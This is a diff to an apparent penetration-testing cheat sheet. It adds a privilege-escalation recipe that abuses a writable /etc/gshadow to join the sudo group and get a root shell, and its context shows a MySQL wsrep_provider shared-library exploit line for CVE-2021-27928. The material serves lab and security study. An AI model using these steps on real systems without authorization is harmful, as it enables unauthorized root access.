@@ -23,6 +23,9 @@ $ sudo apt install openssh-server
 $ ssh root@10.10.10.10
 $ ssh root@10.10.10.10 -i id_rsa
 
+=> Nmap
+
+
 => Service
 $ sudo systemctl status ssh
 $ sudo systemctl enable ssh
@@ -3910,6 +3913,20 @@ SET GLOBAL wsrep_provider="/tmp/shell.so";
 # References
 https://github.com/Al1ex/CVE-2021-27928
 ```
+
+### Gshadow (/etc/gshadow)
+
+```bash
+# Steps
+-> Ensure /etc/gshadow is writable
+-> Put current user to the sudo group
+	* sudo:*::username
+-> newgrp sudo (login to sudo group)
+-> sudo bash
+
+# References
+https://nepcodex.com/2021/10/tranquil-writeup-hackmyvm-walkthrough/
+``` 
 
 # E. CMS/Web/Application
 
